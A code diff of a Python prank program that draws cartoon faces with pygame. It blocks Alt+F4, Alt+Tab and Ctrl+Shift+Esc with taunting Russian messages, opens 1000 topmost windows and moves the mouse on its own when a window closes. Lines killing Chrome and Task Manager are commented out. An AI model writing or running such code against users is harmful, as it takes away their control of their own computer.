@@ -1,15 +1,14 @@
-from ctypes import windll
+import ctypes
+from ctypes import wintypes
 import os
 import keyboard
 import random
 import pygame
-from pygame.draw import *
+import pyautogui
 pygame.init()
-SetWindowPos = windll.user32.SetWindowPos
 
-
-os.system("taskkill chrome")
-os.system("taskkill taskmgr")
+# os.system("taskkill chrome.exe")
+# os.system("taskkill taskmgr.exe")
 keyboard.add_hotkey("alt + f4", lambda: print('это не выход!'), suppress=True)
 keyboard.add_hotkey("alt + tab", lambda: print('не уйдёшь!'), suppress=True)
 keyboard.add_hotkey("Ctrl + Shift + Esc", lambda: print('не-а )))'), suppress=True)
@@ -35,7 +34,7 @@ def fold(col):
 
 
 
-for i in range(100):
+for i in range(1000):
     import pygame
     from pygame.draw import *
     pygame.init()
@@ -49,7 +48,6 @@ for i in range(100):
     color = (255, 255, 255)
     rect(screen, SCREEN_COLOR, [0, 0, SCREEN1, SCREEN2])
     class my_face:
-        SetWindowPos(pygame.display.get_wm_info()['window'], -1, 500, 500, 0, 0, 0x0001)
         class skin:
             circle(screen, color="yellow", radius=150, center=[200, 200])
         class eyes:
@@ -66,9 +64,25 @@ for i in range(100):
     pygame.display.update()
     clock = pygame.time.Clock()
     finished = False
+    hwnd = pygame.display.get_wm_info()['window']
+
+    user32 = ctypes.WinDLL("user32")
+    user32.SetWindowPos.restype = wintypes.HWND
+    user32.SetWindowPos.argtypes = [wintypes.HWND, wintypes.HWND, wintypes.INT, wintypes.INT, wintypes.INT,
+                                    wintypes.INT, wintypes.UINT]
+    user32.SetWindowPos(hwnd, -1, 400, 400, 0, 0, 0x0001)
     while not finished:
         clock.tick(FPS)
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
+                for i in range(10):
+                    try:
+                        pyautogui.moveRel(300, 0, duration=0.25)
+                        pyautogui.moveRel(0, 300, duration=0.25)
+                        pyautogui.moveRel(-300, 0, duration=0.25)
+                        pyautogui.moveRel(0, -300, duration=0.25)
+                    except:
+                        pass
                 finished = True
     pygame.quit()
+
